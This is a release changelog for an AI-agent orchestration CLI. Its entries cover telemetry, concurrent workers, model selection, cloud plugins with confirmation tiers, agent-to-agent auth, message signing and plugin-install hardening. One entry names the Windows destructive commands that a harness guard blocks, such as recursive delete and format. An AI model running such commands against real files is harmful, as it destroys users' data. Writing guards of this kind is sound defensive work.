**Minor release.** Self-hosted runtime observability + parallelism (`bwoc-harness`): per-turn `gen_ai.request.model` (#BWOC-11) and per-tool `execute_tool` OTel spans (#BWOC-13) under the opt-in `--features otel`, and `--lead` now actually runs up to `--concurrency` workers in parallel (#BWOC-14). Cargo SemVer `2.17.1` → `2.18.0`.

### Added

- **`bwoc-harness --lead` runs workers concurrently (`--concurrency`, BWOC-14).** The Saṅgha lead collected tasks one-at-a-time even with `--concurrency > 1`; now it keeps that many workers in flight (the queue's worker loop spawns each item under a `Semaphore`, the lead tops the queue up as workers finish). `--concurrency 1` is unchanged one-at-a-time behaviour; claim/complete bookkeeping stays single-threaded so there are no shared-state races.
- **`bwoc-harness` per-tool `execute_tool` OTel spans (BWOC-13).** Completing the BWOC-10 follow-up, each tool the model requests now emits an `execute_tool` child span (`gen_ai.operation.name=execute_tool`, `gen_ai.tool.name`) nested under its `bwoc.turn` span. `TurnMetrics` gains an additive `tool_names` list. Same env-gate + dep-quarantine; default build unchanged.

- **`bwoc-harness` per-turn model on OTel spans (BWOC-11).** Each `bwoc.turn` child span now carries `gen_ai.request.model` (the active model that turn, recorded in `TurnMetrics.model`) — useful when token pressure switches the model mid-session. `session-metrics.jsonl` gains an additive `model` field (omitted when empty). Default build + behaviour unchanged.

## [v2026.5.31-2] — 2026-05-31 — 2.17.1

**Patch release.** OpenTelemetry exporter modernization for `bwoc-harness` (opt-in `--features otel`; the default build is unchanged): bumped to opentelemetry 0.32, runtime env-gated, GenAI-semconv attributes, and per-turn `bwoc.turn` child spans (#140, #141). Cargo SemVer `2.17.0` → `2.17.1`.

### Changed

- **`bwoc-harness` OpenTelemetry exporter modernized (BWOC-2).** The optional `--features otel` OTLP exporter moved from opentelemetry 0.27 to **0.32**, is now **runtime env-gated** (silent no-op unless `OTEL_EXPORTER_OTLP_ENDPOINT` is set, so an `otel` build costs nothing until a collector exists), emits GenAI-semconv token usage (`gen_ai.operation.name`, `gen_ai.usage.input_tokens`/`output_tokens`) on the session span, and flushes via an explicit `provider.shutdown()` so a short-lived CLI doesn't drop the span on exit. The default build keeps **zero** OpenTelemetry dependencies (dep-quarantine). (Per-turn child spans land in the BWOC-10 entry below.)
- **`bwoc-harness` per-turn OTel spans (BWOC-10).** Building on BWOC-2, each recorded turn is now replayed as a `bwoc.turn` child span under the session span, carrying that turn's `gen_ai.usage.input_tokens`/`output_tokens`, tool-call count, and a duration reconstructed from `latency_ms`. Same env-gate + dep-quarantine as the session span (no-op unless `OTEL_EXPORTER_OTLP_ENDPOINT` is set; zero deps in the default build).

## [v2026.5.31-1] — 2026-05-31 — 2.17.0

**Minor release.** Two operator-ergonomics features on top of 2.16.1. Cargo SemVer `2.16.1` → `2.17.0`.

### Added

- **`bwoc chat --tmux` auto-starts tmux when needed (#137).** Outside a tmux session it no longer refuses with a "run `tmux new-session` first" hint — it auto-starts (and attaches to) a dedicated `bwoc-<id>` session via `tmux new-session -A` (reattaching if one already exists). Inside a session it still adds a `new-window` as before. A missing `tmux` binary now gives a clear install hint.
- **`bwoc jira` resolves credentials from `.bwoc/secrets.toml` (#135, #136).** `auth.toml` documented the `[jira]` table of the gitignored `0600` `.bwoc/secrets.toml` as credential resolution option 2, but the CLI only read the `BWOC_JIRA_*` env vars — so a secrets-file workspace got `auth: NOT configured`. The documented fallback is now wired (env still wins): fail-closed on an absent/unparseable/group-or-world-accessible file, empty values ignored, token never logged or serialized (reaches the plugin via inherited env only).

## [v2026.5.31-0] — 2026-05-31 — 2.16.1

**Patch release.** Plugin-install + integration-plugin bug fixes on top of 2.16.0, mostly from field reports against the `v2026.5.30-0` build. Cargo SemVer `2.16.0` → `2.16.1`.

### Fixed

- **`bwoc plugin install` accepts every declared plugin kind (#126, #127).** The installer validated `[plugin].kind` against a stale four-kind list (`memory-backend, llm-backend, workflow, audit`), so the bundled reference plugins for the five kinds added since (`jira`, `okr`, `council`, `figma`, `gws`) could not be installed even though they pass `bwoc check`. `validate_plugin_kind` now shares the canonical `check::PLUGIN_KINDS` list, so installer and checker can't drift; the `bwoc check` "expected one of …" messages now derive from the same list too. Test-installing all 19 bundled plugin roots: 11/8 → 19/0.
- **`jira-cloud-rest` query verb works against live Jira Cloud (#128, #129, #132).** The `query` verb called `GET /rest/api/3/search`, which Atlassian removed (HTTP 410, CHANGE-2046) → migrated to the token-paginated `GET /rest/api/3/search/jql` (projection keeps `total`/`start_at`/`max_results` for schema stability and adds `next_page_token`/`is_last`). Project scoping also lifts a trailing `ORDER BY` outside the `AND (...)` predicate instead of producing invalid JQL. Plugin bumped to `0.1.1`; `SPEC.md`/`SPEC.th.md` updated (EN/TH parity).
- **`bwoc gcloud project list` human output no longer reports `0 project(s)` (#130, #131).** `run_project_list` read the plugin response as a bare array, but the `gcloud-project` plugin returns an object `{ok, operation, total, projects:[…]}` — so the count and rows were always empty (`--json` was unaffected). Now reads `total` + `projects` from the object, matching the sibling `compute`/`storage`/`run` list renderers.

## [v2026.5.30-0] — 2026-05-30 — 2.16.0

**Minor release.** Frontier-model surface + self-hosted runtime model control: `primaryModel: "auto"` runtime selection (#120), Claude Opus 4.8 + GPT-5.5 model surface with a backend-neutral `reasoningEffort` knob (#121), the declared-backend count canonicalized at six (#122), and `bwoc spawn` forwarding the agent's model + reasoning-effort (#123). Also bundles the previously-unreleased CI least-privilege + `release.yml` hardening (#116–#118). Cargo SemVer `2.15.0` → `2.16.0`.

### Added

- **`primaryModel: "auto"` runtime model selection** — an agent's `config.manifest.json` may set `primaryModel` to the literal `"auto"` plus an ordered `autoModels` candidate pool; the harness then resolves a concrete model at run time against the **live** provider rather than pinning one at incarnation. Resolution is a deterministic four-criteria pipeline: availability (`ProviderClient::list_models` ∩ candidates), context fit (`model_context_limit` vs an estimated task-token need), task class (an EN/TH keyword + length heuristic splitting heavy vs light work), and cost (candidate order *is* the cost axis — heavy tasks take the most-capable/most-preferred fitting model, light tasks the cheapest). Scoped to harness backends (`ollama` / `openai-compatible`); vendor CLIs (Claude/Codex/Kimi) self-select, so `"auto"` is a no-op there. The resolver also harvests the remaining available candidates and their probed context limits into the harness's previously-empty `LoopConfig` fallback / token-pressure / context-limit fields. New `bwoc-harness::model_select` module; new `NoAutoCandidate` error when the pool is empty or nothing is reachable. `bwoc new` gains no flag — operators opt in by hand-editing the manifest.
- **GPT-5.5 model-surface refresh** — the `bwoc new` picker now recommends GPT-5.5 for Codex and OpenAI-compatible backends, `bwoc help backends` documents the refreshed GPT-5 family examples, and `docs/{en,th}/HARNESS` shows an OpenAI-compatible `primaryModel: "auto"` pool with GPT-5.5 first. The harness also reads optional `reasoningEffort` from `config.manifest.json` and sends it as `reasoning_effort` on OpenAI-compatible completion requests. The neutrality checker now flags hardcoded GPT-5 family IDs in instruction files, preserving backend-neutral `AGENTS.md`.
- **Claude Opus 4.8 support** — `claude-opus-4-8` is now the recommended Claude model in the `bwoc new` picker catalog and the `bwoc help backends` table, and in the EN/TH incarnation docs + how-to examples. The new `reasoningEffort` manifest field also reaches the **Claude** backend: `bwoc run` appends `--effort <level>` to `claude -p` (Opus 4.8 effort control — `low|medium|high|xhigh|max`) when the agent's manifest sets it. The field is backend-neutral and free-form (value space is backend-specific); backends without an effort control ignore it. Effort lives in the manifest only — no `AGENTS.md` placeholder — since it is runtime dispatch config, not LLM-facing instruction.

### Changed

- **`bwoc spawn` forwards the agent's model and reasoning-effort.** `spawn` for harness backends (`ollama` / `openai-compatible`) now passes the manifest's `primaryModel` as `--model` — previously it execed `bwoc-harness` with no model and silently fell back to the harness default (`gemma4`), so `primaryModel` (including the `"auto"` sentinel) was ignored via `spawn` and only worked via `bwoc run`. Vendor backends with a verified effort flag also honour `reasoningEffort`: Claude → `--effort <level>`, Codex → `-c model_reasoning_effort=<level>`. Kimi (boolean `--thinking` only) and Antigravity (no effort flag) emit a one-line note and pass nothing rather than fabricate a mapping. An explicit `--model`/`--effort` in `--extra` always wins.
- **Declared-backend count canonicalized at six.** The docs described the declared backends inconsistently (`four` for the vendor CLIs, `five` with ollama, `six` after the OpenAI-compatible surface refresh); the code has always had six (`Backend` enum / `bwoc new --backend`: claude, antigravity, codex, kimi, ollama, openai-compatible). Normalized the general declared-count statements and enumerated lists to **six** across `PLUGINS`, `ROADMAP`, `SRS`, `ARCHITECTURE` (EN/TH), `help backends`, `configure-backends`, the plugins README, and the agent-template `AGENTS.md`; `check.rs` `BACKEND_NAMES` (neutrality denylist) gains `openai-compatible`. Narrative/CI-reality statements that correctly say "five" (ollama was the fifth added; CI exercises the harness once) are left as-is.
- **`release.yml` drops the `RELEASE_PAT` path (#116, #117)** — the zero-touch PAT hook (added with the #101 fix) was never wired: the secret was unset, so every formula bump used the `GITHUB_TOKEN` fallback (branch push + manual finish command). Removed the PAT plumbing and the now-unused `pull-requests: write` grant; the `bump-formula` job keeps only `contents: write`. No behavior change — the operator still opens + auto-merges the formula PR by hand, as it already did every release.

### Security

- **Least-privilege `GITHUB_TOKEN` on CI workflows (#118)** — `ci.yml` and `docs.yml` now declare an explicit `permissions: contents: read` instead of inheriting the repo default (currently `read`), so a future flip of the repo/org default to "write" can't silently over-grant a checkout-only job. `pages.yml` and the two `claude*` workflows were already correctly scoped.

## [v2026.5.29-3] — 2026-05-29 — 2.15.0

**Minor release.** gcloud IAM project bindings (EPIC-12, #99) — the **fourth and last** write-capable GCP slice and the first use of the risk matrix's top tier, **T4**. Cargo SemVer `2.14.0` → `2.15.0`.

### Added

- **`bwoc gcloud iam {get, add, remove}` (#99)** — project IAM policy operations via the new `workflow/gcloud-iam` plugin. `get` is **T0** (read; never skill-exposed — a policy read discloses security posture). `add`/`remove` of a `(member, role)` binding are **T4 — refuse-by-default**: they run only when the workspace sets `[plugins.gcloud-iam] writes_enabled = true` **and** the operator clears a typed `member role` confirm. Public principals (`allUsers`/`allAuthenticatedUsers`) are hard-refused; high-privilege roles (`owner`/`editor`/`*.admin`/`iam.*`) are flagged in the prompt. `--json` requires `--yes`. Validators for project id / IAM member / role; `bwoc check` auto-audits the manifest. Deferred: `set-iam-policy`, SA-key minting, custom roles, non-project resource IAM.

### Security

- **IAM writes are gated at the matrix's top tier (T4).** Reversibility (a matching `remove`/`add` undoes a binding) does **not** demote the tier — the exposure window during a bad grant is not undoable, so the blast radius is security. The standing `writes_enabled` opt-in + typed-name confirm are layered on the existing `--`/`=` option-injection guard (#92): member/role reach `gcloud` as `--flag=value`, the project id as a positional after `--`. The plugin reads no credential value (Adinnādāna) and never mints one (no SA-key creation).

## [v2026.5.29-2] — 2026-05-29 — 2.14.0

**Minor release.** gcloud Cloud Run serverless (EPIC-11, #98) — the third write-capable GCP slice, on the EPIC-8 foundation. Cargo SemVer `2.13.0` → `2.14.0`.

### Added

- **`bwoc gcloud run {list, describe, deploy}` (#98)** — Cloud Run service operations via the new `workflow/gcloud-run` plugin. Reads (`list`/`describe`) are unguarded (T0); **`deploy` is T2 — confirm + echoed target** (resolved `service / region / {image|source} / traffic`, since a deploy routes 100% traffic to the new revision but is reversible via revision rollback). `deploy` requires `--service`/`--region` + exactly one of `--image`/`--source` (`--source` canonicalized to an absolute existing dir); service/region names validated before dispatch. `--json` requires `--yes`. Standalone `gcloud-build` and `services delete` are deferred to their own slices.

### Security

- **gcloud-run reads no credential value (Adinnādāna).** It sources the sibling `gcloud-auth` helpers and asks `gcloud` for Cloud Run state; `auth.toml` declares shape only. Operator values reach `gcloud` as `--flag=value` or after a `--` separator (option-injection guard, #92 precedent); the BWOC CLI owns the T2 gate so the plugin runs `gcloud run deploy --quiet`. `bwoc check` auto-audits the plugin manifest.

## [v2026.5.29-1] — 2026-05-29 — 2.13.0

**Minor release.** Google Workspace `gws` plugin kind (#107) + gcloud storage objects (EPIC-10, #97). Cargo SemVer `2.12.0` → `2.13.0`.

### Added

- **`gws` plugin kind + `bwoc gws {auth, drive, gmail, calendar}` (#107)** — a read-mostly Google Workspace integration (the framework's ninth plugin kind). `gws-auth` owns the OAuth2 credential surface; `gws-drive`/`gws-gmail`/`gws-calendar` source the token from it and project Drive files / Gmail threads / Calendar events into the Workspace Resource Schema. Each plugin ships an EN/TH SPEC pair; `bwoc check` gains a fail-closed `audit_gws_auth` secret-leak guard.
- **`bwoc gcloud storage {list, stat, put, delete}` (#97)** — Cloud Storage object operations via the new `workflow/gcloud-storage` plugin. Reads (`list`/`stat`) are unguarded; `put` is stat-first (T1 new / T2 overwrite, echoing the existing object); **`delete` is T3 — typed-name confirmation** (re-type `gs://bucket/object`), the first irreversible-write tier of the EPIC-9 risk matrix. `--instance`-style validation on bucket/object before dispatch.

### Security

- **OAuth tokens never touch tracked files (gws).** The token is runtime-resolved from `BWOC_GWS_TOKEN` or a `0600` `.bwoc/secrets/gws-token.json`, handed only to the `Authorization: Bearer` header, and never serialized into output (Adinnādāna). `auth.toml` declares shape only; `bwoc check` fails closed on any value-looking field. REST query params are URL-encoded and resource/calendar IDs + queries are validated before dispatch (no injection).
- **gcloud storage writes are tiered by reversibility × blast radius** — `put` stat-first (T1/T2), `delete` T3 (typed-name). Operator values reach `gcloud` as `--flag=value` or after a `--` separator (option-injection guard, #92 precedent).

## [v2026.5.29-0] — 2026-05-29 — 2.12.0

**Minor release.** gcloud compute lifecycle (#96) — the first write-capable GCP slice (EPIC-9), on the EPIC-8 foundation. Cargo SemVer `2.11.0` → `2.12.0`.

### Added

- **`bwoc gcloud compute {list, describe, start, stop}` (#96)** — instance lifecycle via the new `workflow/gcloud-compute` plugin. Reads (`list`/`describe`) are unguarded; `start` is confirmation-gated (T1), `stop` is gated **with the resolved `project/zone/instance` echoed** (T2). `--json` requires `--yes`; `--instance`/`--zone` are required and validated (RFC 1035) before dispatch. Sources the sibling `gcloud-auth` credential helpers; `auth.toml` is shape-only; `bwoc check` audits the plugin.
- **Reusable write-verb risk matrix** — the design note authors the T0–T4 confirmation-tier template (read → reversible/cost → reversible/availability → irreversible/typed-name → security/opt-in) that the remaining GCP slices (storage #97, serverless #98, IAM #99) instantiate.

### Security

- Compute writes pass every operator value to `gcloud` as `--flag=value` or after a `--` end-of-options separator (option-injection guard, #92 precedent), and reject `-`-leading instance/zone ids at the CLI before dispatch. `start`/`stop` mutate remote instances but are reversible; `delete`/`reset`/`create` are deliberately out of scope.

### Fixed

- **`release.yml` no longer fails when `RELEASE_PAT` is unset (#101)** — the Homebrew formula-bump step pushed the branch then failed creating the PR (the org blocks `GITHUB_TOKEN` from opening PRs), turning every release run red. It now exits green and prints the one finish command in the job summary; with `RELEASE_PAT` set it opens + auto-merges the formula PR hands-off.

## [v2026.5.28-1] — 2026-05-28 — 2.11.0

**Minor release.** GCP `gcloud` workflow plugin foundation (#86) — the framework's second `workflow`-kind integration (after `jira`), designed read-mostly-first. Cargo SemVer `2.10.0` → `2.11.0`.

### Added

- **`bwoc gcloud {auth, project, status}` (#86)** — dispatches the `workflow/gcloud-*` reference plugins (no new plugin kind). `auth status`/`login`, `project list`/`show`/`set-default`, and an aggregate `status`. `--json` twins on every verb.
- **Two reference plugins** — `gcloud-auth` (credential **state** only: active source + account email, never the token) and `gcloud-project` (`list`/`show`/`set-default`). Auth precedence ADC → service-account JSON (`.bwoc/secrets/gcloud-sa.json`, gitignored) → `BWOC_GCLOUD_*` env; `auth.toml` declares **shape only, no values**.
- **`gcloud-ops` skill** — the first skill spanning multiple plugins (`whoami`/`current-project`/`switch-project`); `login` excluded (browser-driven). EN/TH SPEC pairs for both plugins + the skill.
- **`bwoc check` audits `workflow/gcloud-*`** — manifest entry path-traversal + an `auth.toml` secret-leak guard (fail-closed, value redacted) + `bwoc skill verify gcloud-ops` resolution.

### Security

- **`auth.toml` carries no credential values** — the plugins never read a secret; `bwoc check` fails closed on any value-looking field (mirrors the jira guard).
- **Write verbs are confirmation-gated** — `project set-default` (local `gcloud` config only) and `auth login` prompt; `--json` requires `--yes`. Project ids are validated (`6–30`, `[a-z0-9-]`, lowercase-first) before dispatch.
- **Option-injection hardening (#92)** — plugin shell-outs pass operator-supplied values to `gcloud` after a `--` end-of-options separator, so a `-`-leading id can never be parsed as a flag.

## [v2026.5.28-0] — 2026-05-28 — 2.10.0

**Minor release.** A2A auth phase (#80, PRs #81–#84, #87) — the follow-up to A2A v1 (#48): the listener is now safe to expose beyond loopback, and the outbound client authenticates to peers. Closes the security deferrals the v1 notes flagged. Cargo SemVer `2.9.0` → `2.10.0`.

### Added

- **Inbound Bearer auth (AP1, #81)** — when a token is configured (`BWOC_A2A_TOKEN` env or the agent's `.bwoc/a2a.token` file), the JSON-RPC + SSE endpoints require `Authorization: Bearer <token>`; the Agent Card GET stays public and advertises the requirement (`securitySchemes`/`security`). No token ⇒ the unchanged loopback-only posture.
- **Webhook delivery (AP3, #83)** — the push-notification delivery deferred in v1 now fires: when auth is on, a watcher POSTs `TaskStatusUpdateEvent`s to registered webhooks (bearer-authed from the stored config), gated by an SSRF egress filter.
- **Outbound client auth (AP5, #87)** — `bwoc a2a send`/`fetch-card` present a per-peer bearer token from `<workspace>/.bwoc/a2a-credentials.json` (origin-keyed, `0600`-gated) or a `--token` override; `send` honors the remote card's declared scheme, presenting the credential only to a peer that declares Bearer.
- **`bwoc a2a serve --allow-unauthenticated` (AP2, #82)** — opt back into serving a non-loopback bind without a token (loud warning), for trusted networks / a front proxy that adds auth.

### Changed

- **A non-loopback `--bind` now refuses to start without auth (AP2, #82)** — previously it warned and served. A token (or `--allow-unauthenticated`) is required to expose the listener beyond loopback; loopback and auth-on binds are unchanged.

### Security

- **Constant-time token comparison** for the inbound Bearer check (AP1, #81); the scheme is matched case-insensitively (RFC 7235).
- **`0600` gate** on secret files read by the listener/client — `.bwoc/a2a.token` (AP1) and `.bwoc/a2a-credentials.json` (AP5) are refused if group/world-readable, with a `chmod 600` remediation.
- **SSRF guard on webhook delivery (AP3, #83)** — webhook URLs resolving to loopback/private/CGNAT/link-local/metadata (`169.254.169.254`)/ULA ranges are rejected; non-loopback must be `https`; the connection is **pinned** to the validated IP so a DNS rebind can't redirect the POST to an internal service.
- **Rate limit + concurrency cap (AP4, #84)** — a global token-bucket request rate limit (`429` + `Retry-After` when exceeded) and a `SubscribeToTask` concurrent-stream cap, applied unconditionally as resource guards for the exposed endpoint.
- **No outbound credential leak (AP5, #87)** — the client never sends a bearer token to a peer whose card declares no auth.

## [v2026.5.27-3] — 2026-05-27 — 2.9.0

**Minor release.** A2A (Agent2Agent) protocol interop — v1 (#48, PRs #71–#77). BWOC agents can now talk to non-BWOC agents over the open A2A 1.0.0 protocol. Cargo SemVer `2.8.0` → `2.9.0`.

### Added

- **`bwoc a2a serve <agent>` (#48)** — run an A2A HTTP listener for a local agent: the Agent Card at `/.well-known/agent-card.json` and a JSON-RPC endpoint. `SendMessage` drops the inbound message into the agent's `inbox.jsonl`. **Loopback-only by default** (no auth yet); a non-loopback `--bind` warns. Per-request body + inbox size caps guard growth.
- **`bwoc a2a card <agent>`** — print the agent's manifest-derived Agent Card.
- **`bwoc a2a fetch-card <url>` / `bwoc a2a send <url> "<text>"`** — outbound client: fetch a remote agent's card, or send it a `SendMessage` (reqwest, `rustls-tls`).
- **A2A `tasks/*`** — `GetTask`/`ListTasks` bridge a team's Saṅgha task list (`bwoc a2a serve --team <id>`); `CancelTask` honestly returns `TaskNotCancelable` (the lead owns task lifecycle).
- **A2A SSE streaming** — `SubscribeToTask` streams a team task's state transitions; `SendStreamingMessage` is an honest single-event stream (BWOC processes asynchronously).
- **A2A push-notification config** — `Create`/`Get`/`List`/`DeleteTaskPushNotificationConfig` manage per-task webhook configs (persisted, `0600`). Webhook *delivery* is deferred to the auth phase (an SSRF/exfil egress under no-auth).
- **New `bwoc-a2a` crate + binary** — the A2A protocol core, listener, client, and config CRUD. `bwoc a2a` execs the `bwoc-a2a` sibling binary so the **HTTP/async stack (axum, tokio, reqwest) never enters `bwoc-cli`'s dependency tree** (the `bwoc-harness` subprocess pattern); `bwoc-core` stays HTTP-free.

### Notes

- A2A v1 is loopback-only and unauthenticated by design. The **auth phase** (authenticated peers, non-loopback bind, per-peer rate + subscription-concurrency caps, push webhook delivery + SSRF guard, outbound signing) is a separate future milestone.

## [v2026.5.27-2] — 2026-05-27 — 2.8.0

**Minor release.** Cross-workspace give-feedback — the write path of #20. Cargo SemVer `2.7.0` → `2.8.0`.

### Added

- **`bwoc peer feedback <agent> "<review>" --from <local-agent>` (#20 / #67)** — deliver a signed `kind: feedback` envelope into a peer agent's inbox across the interconnect mesh (local-FS). Peer-routed (skips the local fast path), **signature-required** (fails at the source if the sender has no key), and no spurious local tmux wakeup. Completes the three peer verbs (view + learn shipped in 2.3.0).

### Changed

- **Trust gate verifies cross-workspace senders (#66).** On a local-registry miss, the `bwoc-agent` trust gate resolves the sender via the recipient's `routes.toml` + the peer's published `signingPublicKey` and verifies the signature, instead of refusing every peer as `unknown_sender`. Read-vs-write split: a cross-workspace write requires a provable signature in `warn` as much as `enforce` (unsigned ⇒ `unsigned_cross_workspace`); `BWOC_SIGNING_MODE=off` remains the global escape hatch.

## [v2026.5.27-1] — 2026-05-27 — 2.7.0

**Minor release.** Installable plugins & skills + ISO-compliance audit plugins. Cargo SemVer `2.6.0` → `2.7.0`.

### Added

- **Installable plugins (#58)** — `bwoc plugin install` (git URL or tarball; first install acknowledged via `--allow-new-source`) + `bwoc plugin list --kind`. Remote installs are gated by a SHA-256 sidecar; a missing sidecar on a git source is **refused** (publish a `.sha256` or pass `--no-verify`) rather than silently passing the gate (BWOC-38).
- **Installable skills (#58)** — `bwoc skill` install/list/verify. The `[gates].verify` command is arbitrary shell from an untrusted manifest, so it is **never executed by default** — static checks only, command printed for inspection; opt in with `--run-gates` (BWOC-37).
- **ISO-compliance audit plugins (#58)** — `bwoc audit run` dispatches `audit`-kind plugins through a strict findings schema (severity/status/evidence enums; exit code = fail count). Ships **ISO 9001** (signed-attestation runtime), **27001 · 20000-1** (honest `not_implemented` stubs), and **29110** (filesystem-evidence runtime), plus a signed-attestation evidence model (`attestation` / `sample` evidence kinds).
- Plugin/skill templates, the `worktree-discipline` skill, and the `memory-tier2-noop` plugin.

### Security

- Plugin/skill `entry` is validated against path traversal before spawn — a manifest cannot point `entry` at an arbitrary host binary (`..`/absolute rejected, BWOC-36).
- Git installs no longer treat a missing checksum sidecar as a verified install (BWOC-38); tarball-slip and git-ref option injection hardened.

## [v2026.5.27-0] — 2026-05-27 — 2.6.0

**Minor release.** `bwoc-harness` v2 (the #39 epic) + ed25519 message authentication. Cargo SemVer `2.5.0` → `2.6.0`.

### Added

- **harness-v2 (#39 / #57)** — durable/resumable runs (per-turn checkpoint + `--resume`, HV2-2), Saṅgha runtime (a lead spawns sandboxed subprocess workers, HV2-1), run-end retrospective (HV2-3), MCP client (HV2-5), per-run budget hard gate (HV2-6), streaming usage + concurrent tool execution (HV2-7).
- **ed25519 message signing (HV2-4)** — new lean `bwoc-signing` crate (RFC 8785 JCS canonical form); `bwoc send` signs envelopes; `bwoc trust --keygen [--all]` generates/backfills keypairs (private key 0600 in `.bwoc/agent.key`, public key in the manifest); the `bwoc-agent` trust gate verifies the signature before the Kalyāṇamitta check — **enforce by default** (`BWOC_SIGNING_MODE`), bad/tampered signatures refused in every mode. Spec: [`SIGNING.en.md`](docs/en/SIGNING.en.md).

## [v2026.5.25-1] — 2026-05-25 — 2.5.0

**Minor release.** Live fleet operations + a self-updating toolchain. Cargo SemVer `2.4.0` → `2.5.0`. CalVer per [VERSION.md policy](VERSION.md#versioning-policy--dual-namespaces).

### Added

- **`bwoc inbox --all --watch` — fleet-wide merged live message stream (#46)** — lifts the prior `--all`+`--watch` refusal (`--clear` stays refused under `--all`) and tails every agent's inbox at once, each new envelope tagged with its recipient in arrival order; `--json` adds a `recipient` field. Reuses the single-inbox tail core (`read_complete_lines_from`) — one watcher, not two.
- **`bwoc dashboard` live agent-activity (#45)** — the TUI dashboard gains a per-agent activity column (working/idle/running/stale) fed by `bwoc sessions` on the existing 2 s tick, plus a detail pane (session state + backend + pid + last-seen) and a capped live log tail. Observe-only; reuses the `sessions` resolver.
- **Startup update-check — opportunistic drift notice (#44)** — released binaries now print a one-line "newer release available" notice (to stderr) on normal use, throttled to ≤1 network check / 24 h via a `~/.bwoc/update-check.json` cache refreshed in a detached background process. Guarded (TTY-only, skips `--json`/piped/`SourceBuild`/the `update` command), opt-out `BWOC_NO_UPDATE_CHECK=1`, silent offline. Closes the stale-install gap first observed in #3.

### Changed

- **Homebrew formula auto-bumps on release (#52)** — `release.yml` gains a `bump-formula` job that rewrites `Formula/bwoc.rb` (version + url tags + sha256 from the release sidecars) and commits it on every release-tag publish, so the tap can never go stale again. Logic lives in `scripts/bump-formula.sh` (locally testable). Manual 2.4.0 catch-up was #51.

### Fixed

- **What's New banner showed the wrong version** — `whats_new` HEADLINE/HIGHLIGHTS were stuck at the 2.3 release, so a 2.4.0 build greeted users with "BWOC 2.3". Updated, and a guard test (`headline_version_matches_build`) now asserts HEADLINE tracks `CARGO_PKG_VERSION` major.minor so it can't silently drift again.

## [v2026.5.25-0] — 2026-05-25 — 2.4.0

**Minor release.** Phase 4's one framework-owned line item lands as a command — `bwoc fleet health` (#35) — and the Windows destructive-command guardrails (#31) close the caveat flagged in 2.3.0's Windows-support entry. Cargo SemVer `2.3.0` → `2.4.0`. CalVer per [VERSION.md policy](VERSION.md#versioning-policy--dual-namespaces). (The `bwoc sessions` monitor (#21) also merged in this window; it was already described in the 2.3.0 entry below.)

### Added

- **`bwoc fleet health [--json]` — Aparihāniya-dhamma 7 governance signals (issue #35)** — turns the [`FLEET-GOVERNANCE.en.md`](docs/en/FLEET-GOVERNANCE.en.md) spec's *stubbed* signals into a real **read-only, report-only** command (no gating — v1 ships signals; v2 may promote to gates once telemetry justifies). One workspace-scoped run reports each of the seven DN 16 non-decline conditions as ✓ / ⚠ / ℹ: **1** regular meetings (agent-dir mtime vs `--stale-days`), **2** coordinated start/end (reuses `doctor` stale PID/socket findings), **4** honor template version, **5** protect vulnerable (inbox-refusal counts) — mechanical; **3** convention drift (`git status .bwoc/` porcelain) and **6** shared-resource authorship (`git` author vs operator) — git-backed mechanical checks (exceeding the v1 informational-only slice); **7** protect senior agents — informational. Orchestrates existing surfaces (registry / `doctor` / `check` / inbox refusals) rather than reimplementing; dep-lean; backend-neutral. 15 unit tests.

### Fixed

- **Windows destructive-command guardrails (issue #31)** — the harness dangerous-path guard was unix-oriented; it now also blocks Windows destructive patterns (`del /s`, `rmdir /s`, `format`, `Remove-Item -Recurse`), closing the caveat noted in the 2.3.0 `bwoc-harness — Windows support` entry. Realises Sīla *Pāṇātipāta* (no destruction) uniformly across shells (Samānattatā).

## [v2026.5.24-1] — 2026-05-24 — 2.3.0

**Minor release.** The plugin-system cycle (#6) — a real OS-level sandbox (landlock / `sandbox-exec`, replacing the stub), `bwoc-harness` Windows support, an OpenAI-compatible provider + vetted-model mode, cross-workspace `bwoc peer` view/learn, the `bwoc sessions` monitor, Trust v2 warn-mode, the document-kind mechanism, per-model token-limit auto-switch, and `bwoc run` / `bwoc update`. Cargo SemVer `2.2.0` → `2.3.0`. CalVer per [VERSION.md policy](VERSION.md#versioning-policy--dual-namespaces).

### Added

- **`bwoc run <agent> --task` — headless single-task invocation (issue #5)** — runs an agent on one task with no interactive session: the `claude` backend shells `claude -p`, `ollama` routes through `bwoc-harness`, and `codex` / `agy` / `kimi` return `HeadlessUnsupported` rather than failing silently. A `CommandRunner` trait keeps the path unit-testable offline (mock runner). Closes the "agents aren't headlessly runnable" gap that blocked autonomous orchestration.
- **Tier 2 pluggable deep-memory backend** — a `DeepMemory` trait (`wake_up` / `search` / `mine`) in `bwoc-core` with a `ShellDeepMemory` reference impl (shells the `deepMemoryCmd` from `config.manifest.json`) and a `DisabledDeepMemory` no-op when Tier 2 is unconfigured; surfaced as `bwoc memory wake-up | t2-search <query> | mine <path>`. Realises AGENTS.md §7.2 — the optional deep-memory tier whose absence never breaks the agent.
- **`bwoc update` — release-drift detection + delegate-only upgrade (issue #8)** — `bwoc update --check` is a read-only check comparing the binary's embedded Release CalVer (`option_env!("BWOC_RELEASE_CALVER")`, baked in by `release.yml`) against the latest GitHub release tag (up-to-date / update-available / source-build). Honours the [VERSION.md policy](VERSION.md) that *CalVer is the public release identity* (not SemVer). Plain `bwoc update` detects the install method and **delegates** the upgrade: Homebrew → `brew upgrade bwoc`, cargo → `cargo install --git …`, raw binary → points at the release page (no self-swap). Prints the command by default; `--run` executes the delegated package-manager command. Stays dep-lean — no HTTP client; shells `gh` / `curl` behind a `CommandRunner` seam (offline-unit-tested, 26 tests). **Self-replacing a raw binary is intentionally deferred** (destructive — Sīla *Pāṇātipāta* — and never done on uncertainty). Pairs with the #3 startup drift guard.
- **Workspace document-kind mechanism — `bwoc notes | retro | research` (epic #12, subsumes #10/#11)** — one generic engine over a `bwoc-core::doc_kind` registry: each kind (`notes`, `retrospectives`, `research`) is a `DocKind { dir, committed, template }`, and `bwoc <kind> new|list|view` scaffolds `<dir>/YYYY-MM-DD_<slug>.md` (refusing to clobber), lists newest-first, and views by date/name. Templates are framework-grounded — notes = the CLAUDE.md log skeleton, retrospectives = Paññā-3 (Sutamayā/Cintāmayā/Bhāvanāmayā), research = Question/Scope/Sources/Findings/Recommendation. Bilingual `NAMING` rows added for the two new dirs. dep-lean; one code path, no per-kind duplication. Extended (#18) with **workspace-declared custom kinds** (`.bwoc/doc-kinds.toml` + a generic `bwoc doc <kind>` command) and **retro metrics-prefill** (summarises `session-metrics.jsonl` into the retrospective's `## Metrics` section).
